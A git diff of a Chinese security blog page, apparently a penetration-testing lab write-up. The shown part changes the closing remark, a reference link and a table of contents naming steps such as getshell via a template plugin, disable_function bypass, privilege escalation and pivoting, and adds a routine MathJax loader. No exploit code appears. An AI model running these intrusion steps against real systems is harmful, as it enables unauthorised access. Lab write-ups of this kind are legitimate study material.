+<p>基本上是第二台靶机的问题了，后面的就没法再继续下去了...</p>
+<h3 id="references">References</h3>
+<p>https://n0puple.github.io/2021/07/06/%E6%9E%81%E8%87%B4cms1-7-%E5%90%8E%E5%8F%B0%E4%B8%A4%E5%A4%84getshell/</p>
 
     </div>
 
@@ -568,7 +637,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8B%93%E6%89%91"><span class="nav-number">1.</span> <span class="nav-text">拓扑</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%96%E7%BD%91%E6%9C%BA%E5%99%A8-centos7"><span class="nav-number">2.1.</span> <span class="nav-text">外网机器 centos7</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="nav-number">3.</span> <span class="nav-text">外网打点</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">3.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="nav-number">3.2.</span> <span class="nav-text">目录扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E5%A4%B1%E8%B4%A5"><span class="nav-number">3.3.</span> <span class="nav-text">文件上传(失败)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A8%A1%E6%9D%BF%E7%BC%96%E8%BE%91%E6%8F%92%E4%BB%B6Getshell"><span class="nav-number">3.4.</span> <span class="nav-text">模板编辑插件Getshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#disable-function%E7%BB%95%E8%BF%87"><span class="nav-number">3.5.</span> <span class="nav-text">disable_function绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.6.</span> <span class="nav-text">提权</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E7%AC%AC%E4%BA%8C%E5%8F%B0%E6%9C%BA%E5%99%A8"><span class="nav-number">4.</span> <span class="nav-text">横向第二台机器</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1"><span class="nav-number">4.1.</span> <span class="nav-text">添加路由</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-1"><span class="nav-number">4.2.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ZenTao-%E5%90%8E%E5%8F%B0getshell-%E5%A4%B1%E8%B4%A5"><span class="nav-number">4.3.</span> <span class="nav-text">ZenTao 后台getshell(失败)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#References"><span class="nav-number">5.</span> <span class="nav-text">References</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8B%93%E6%89%91"><span class="nav-number">1.</span> <span class="nav-text">拓扑</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%96%E7%BD%91%E6%9C%BA%E5%99%A8-centos7"><span class="nav-number">2.1.</span> <span class="nav-text">外网机器 centos7</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="nav-number">3.</span> <span class="nav-text">外网打点</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">3.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="nav-number">3.2.</span> <span class="nav-text">目录扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%B1%E8%B4%A5"><span class="nav-number">3.3.</span> <span class="nav-text">文件上传(失败)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A8%A1%E6%9D%BF%E7%BC%96%E8%BE%91%E6%8F%92%E4%BB%B6getshell"><span class="nav-number">3.4.</span> <span class="nav-text">模板编辑插件Getshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#disable_function%E7%BB%95%E8%BF%87"><span class="nav-number">3.5.</span> <span class="nav-text">disable_function绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.6.</span> <span class="nav-text">提权</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E7%AC%AC%E4%BA%8C%E5%8F%B0%E6%9C%BA%E5%99%A8"><span class="nav-number">4.</span> <span class="nav-text">横向第二台机器</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1"><span class="nav-number">4.1.</span> <span class="nav-text">添加路由</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-1"><span class="nav-number">4.2.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#zentao-%E5%90%8E%E5%8F%B0getshell%E5%A4%B1%E8%B4%A5"><span class="nav-number">4.3.</span> <span class="nav-text">ZenTao 后台getshell(失败)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#references"><span class="nav-number">5.</span> <span class="nav-text">References</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -584,7 +653,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -632,7 +701,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -646,7 +715,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -657,7 +726,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -797,6 +866,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
